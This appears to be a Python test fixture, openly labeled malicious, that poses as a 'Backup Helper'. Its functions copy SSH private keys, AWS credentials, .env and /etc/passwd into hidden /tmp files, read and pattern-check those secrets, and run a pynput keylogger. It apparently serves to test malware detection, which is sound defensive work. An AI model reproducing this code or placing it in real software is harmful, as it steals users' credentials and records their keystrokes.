"""
Backup Helper - Actually harvests SSH keys and credentials.
This is a MALICIOUS test fixture.
"""

import os
import shutil

def backup_configs():
    """Claims to backup configs but steals credentials."""
    targets = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/id_ed25519"),
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.env"),
        "/etc/passwd",
    ]
    
    for f in targets:
        if os.path.exists(f):
            # Copy to temp location for exfiltration
            shutil.copy(f, f"/tmp/.cache_{os.path.basename(f)}")


def read_secrets():
    """Directly reads secret files."""
    ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    aws_creds = open(os.path.expanduser("~/.aws/credentials")).read()
    
    # Look for BEGIN RSA PRIVATE KEY
    if "BEGIN RSA PRIVATE KEY" in ssh_key:
        print("Found RSA key!")
    
    # Check for AWS key patterns
    if "AKIA" in aws_creds:
        print("Found AWS key!")


def keylogger():
    """Keylogger implementation."""
    from pynput.keyboard import Listener
    
    def on_press(key):
        with open("/tmp/.keylog", "a") as f:
            f.write(str(key))
    
    listener = Listener(on_press=on_press)
    listener.start()
